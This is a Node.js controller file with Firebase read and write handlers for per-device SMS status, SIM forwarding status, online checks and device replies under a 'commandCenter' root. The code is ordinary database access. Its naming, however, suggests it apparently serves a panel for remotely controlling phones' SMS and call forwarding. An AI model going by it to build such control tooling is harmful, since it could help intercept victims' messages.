import { rtdb } from "../config/db.js";

const ROOT = "commandCenter";

/* ============================================================
   ⭐ GET SMS STATUS OF ONE DEVICE — BY UID
   Path: /api/device/:uid/sms-status
============================================================ */
export const getSmsStatusByDevice = async (req, res) => {
  try {
    const { uid } = req.params;

    const snap = await rtdb.ref(`${ROOT}/smsStatus/${uid}`).get();

    if (!snap.exists()) {
      return res.json({ success: true, data: [] });
    }

    const raw = snap.val();
    const list = [];

    Object.entries(raw).forEach(([smsId, obj]) => {
      list.push({
        smsId,
        uid,
        ...obj,
      });
    });

    list.sort((a, b) => b.at - a.at);

    return res.json({ success: true, data: list });

  } catch (err) {
    console.error("❌ getSmsStatusByDevice ERROR:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
};


/* ============================================================
   ⭐ GET SIM FORWARD STATUS — BY UID
   Path: /api/device/:uid/sim-forward
============================================================ */
export const getSimForwardStatus = async (req, res) => {
  try {
    const { uid } = req.params;

    const snap = await rtdb.ref(`simForwardStatus/${uid}`).get();

    if (!snap.exists()) {
      return res.json({ success: true, data: [] });
    }

    const raw = snap.val();
    const list = [];

    Object.entries(raw).forEach(([simSlot, obj]) => {
      list.push({
        simSlot: Number(simSlot),
        ...obj,
      });
    });

    list.sort((a, b) => b.updatedAt - a.updatedAt);

    return res.json({ success: true, data: list });

  } catch (err) {
    console.error("❌ getSimForwardStatus ERROR:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
};


export const saveCheckOnlineStatus = async (req, res) => {
  try {
    const { uid } = req.params;
    const { available } = req.body;

    if (!uid) {
      return res.json({
        success: false,
        message: "uid missing",
      });
    }

    const checkedAt = Date.now();

    const data = {
      // agar body me na bheje to default "checking"
      available: available || "checking",
      checkedAt,
    };

    await rtdb.ref(`checkOnline/${uid}`).set(data);

    return res.json({
      success: true,
      message: "Check Online Updated",
      data: { uid, ...data },
    });
  } catch (err) {
    console.error("❌ saveCheckOnlineStatus ERROR:", err);
    return res.status(500).json({
      success: false,
      message: "Server error",
    });
  }
};

/* ============================================================
   ⭐ GET DEVICE ONLINE REPLY — replyCollection/{uid}
   Path: /api/brosreply/:uid
============================================================ */
export const getBrosReply = async (req, res) => {
  try {
    const { uid } = req.params;

    if (!uid) {
      return res.json({
        success: false,
        message: "uid missing",
      });
    }

    const snap = await rtdb.ref(`replyCollection/${uid}`).get();

    if (!snap.exists()) {
      return res.json({
        success: true,
        data: null, // empty
        message: "No reply found"
      });
    }

    const data = snap.val();

    return res.json({
      success: true,
      data: {
        uid,
        ...data,
      },
    });

  } catch (err) {
    console.error("❌ getBrosReply ERROR:", err);
    res.status(500).json({
      success: false,
      message: "Server error",
    });
  }
};
